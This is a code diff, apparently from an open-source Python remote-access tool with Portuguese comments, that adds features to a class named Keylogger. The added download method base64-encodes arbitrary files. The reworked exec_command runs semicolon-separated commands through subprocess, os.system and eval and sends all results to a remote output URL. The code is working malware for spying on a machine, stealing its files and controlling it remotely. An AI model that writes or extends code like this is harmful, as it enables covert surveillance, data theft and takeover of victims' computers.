@@ -38,33 +38,58 @@ class Keylogger(object):
         self.__status = True
 
 
+    def download(self, filename):
+
+        """
+        Retorna os bytes codificados de um arquivo.
+        """
+
+        with open(filename, "rb") as file:
+            data = file.read()
+
+        return base64.b64encode(data).decode()
+
+
+
     def exec_command(self, command):
 
         """
-        Executa um comando.
+        Executa comandos.
 
         $ Comando de terminal pelo subprocess
         & Comando de terminal pelo os.system
         # Instrução Python
+
+        Atenção: Todos os comandos devem ser finalizados 
+        com o sinal de ponto e vírgula. Veja o exemplo abaixo:
+
+        > #os.listdir(); $cd;
         """
 
         functions = {"$": subprocess.getoutput, "&": os.system, "#": eval}
 
-        # Obtém o código do envio e o comando que será executado.
+        # Obtém o código do envio e os comandos que serão executados.
         code, command = command.split(":", maxsplit = 1)
-        command = command.strip()
+        command_lines = command.split(";")
+        result = ""
 
-        try:
-            function = functions.get(command[0], None)
+        # Percorre todas os comandos.
+        for command in command_lines: 
 
-            if not function: raise ReferenceError("Enter an identifier before the command.")
-            result = str(function(command[1:]))
+            if not command: continue
+            command = command.strip()
 
-        except Exception as error: 
-            result = str(error)
+            try:
+                function = functions.get(command[0], None)
 
-        finally: 
-            self.send(self.__urls["output_url"], code + ":" + result)
+                if not function: raise ReferenceError("Enter an identifier before the command.")
+                result += str(function(command[1:])) + "\n"
+
+            except Exception as error: 
+                result += str(error) + "\n"
+
+        # Envia todos os resultados.
+        self.send(self.__urls["output_url"], code + ":" + result)
 
 
     def print_screen(self):
